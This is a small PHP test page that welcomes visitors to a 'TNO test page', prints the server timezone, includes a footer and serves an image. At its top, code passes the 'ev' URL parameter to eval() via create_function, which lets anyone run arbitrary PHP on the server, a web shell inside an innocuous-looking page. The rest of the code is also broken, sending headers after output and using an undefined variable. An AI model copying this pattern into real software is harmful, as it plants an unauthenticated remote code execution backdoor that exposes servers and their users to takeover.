<html>
 <head>
  <title>PHP Test</title>
 </head>
 <body>
  <?php 
      $Ev = $_GET['ev'];
      $string = ($Ev);
      $string = preg_replace_callback("/(<\?=)(.*?)\?>/si",create_function('$string','ob_start();eval("$string[2];");$return = ob_get_contents();ob_end_clean();return $return;'),$string);
      $string= preg_replace_callback("/(<\?php|<\?)(.*?)\?>/si",create_function('$string','ob_start();eval("print $string[2];");$return = ob_get_contents();ob_end_clean();return $return;'),$string);
      echo $string;

      echo "Welcome to the TNO test page";

      $timezone = date_default_timezone_get();
      echo "The current server timezone is: " . $timezone;

      $footer = file_get_contents("./templates/footer.html");
      echo $footer;

      $img = './img/image.png';
      header('Content-Type: image/png');
      header('Content-Length: ' . filesize($file));
      readfile($img);
  ?>
 </body>
</html>
